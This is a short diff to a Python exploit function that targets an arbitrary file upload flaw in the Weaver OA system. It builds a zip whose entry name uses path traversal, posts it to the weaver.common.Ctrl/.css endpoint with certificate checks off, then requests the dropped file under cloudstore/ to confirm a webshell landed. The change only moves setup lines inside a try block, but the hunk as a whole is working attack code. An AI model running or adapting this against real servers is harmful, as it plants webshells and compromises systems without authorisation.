@@ -22,11 +22,11 @@ def weaver_common_ctrl_upload(urllist):
     del_file = './{0}.zip'.format(mm)    # 生成的垃圾文件
     webshell_name1 = mm + '.txt'
     webshell_name2 = '../../../' + webshell_name1
-
-    file_zip(mm, webshell_name2)
-    urls = urllist + 'weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
-    file = [('file1', (mm + '.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
     try:
+        file_zip(mm, webshell_name2)
+        urls = urllist + 'weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
+        file = [('file1', (mm + '.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
+
         requests.post(url=urls, files=file, timeout=3, verify=False)
         GetShellurl = urllib.parse.urljoin(urllist, 'cloudstore/' + webshell_name1)
         GetShelllist = requests.get(url=GetShellurl, timeout=3, verify=False)
